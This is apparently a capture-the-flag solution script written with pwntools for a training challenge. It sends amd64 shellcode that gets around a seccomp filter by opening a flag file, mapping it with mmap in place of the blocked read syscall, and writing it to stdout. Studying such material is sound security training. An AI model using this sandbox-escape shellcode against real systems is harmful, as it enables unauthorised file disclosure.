from pwn import *

# The program uses seccomp rules to allow only a few syscalls (open, write, close, exit, exit_group, mmap, mprotect, munmap and nanosleep), then asks for an exploit and executes it.
# There is no read syscall, but mmap does exactly the same.

COMMANDS = '''
b  *main+173
c
'''

context.arch = "amd64"
exe = './open_what_write'
size = 100

# the exploit will be made out of 3 parts:
# 1. opening the file "flag"
shellcode = shellcraft.open('flag')

# 2. mmap call to map file content to a memory area (chosen by the os)
shellcode += '''
    /* moving the file descriptor to r8 */
    push rax
    pop r8
    /* getting syscall number to rax */
    push 9
    pop rax
    /* getting the mapping address to rdi (null, so the kernel can choose an appropriate page) */
    xor edi, edi
    /* getting the mapping length to rsi (must be a page multiple, so n*4096=n*0x1000)*/
    push 0x1000
    pop rsi
    /* getting protection (1 is readonly) to rdx */
    push 1
    pop rdx
    /* setting flags to MAP_PRIVATE ( =2, means only this process - open_what_write - can see this memory area) */
    push 2
    pop r10
    syscall
    /* getting the mapping address to rbx, to use it in the following write */
    push rax
    pop rbx
'''

# 3. writing the mapped content to the stdout
shellcode += shellcraft.write(1, 'rbx', size)
exploit = asm(shellcode)

if args.REMOTE:
    c = remote("open-what-write.training.offensivedefensive.it", 8080, ssl=True)
elif args.GDB:
    c = gdb.debug(exe, gdbscript=COMMANDS)
else:
    c = process(exe)

c.recvuntil(b'shellcode: ')
c.sendline(exploit)
c.interactive()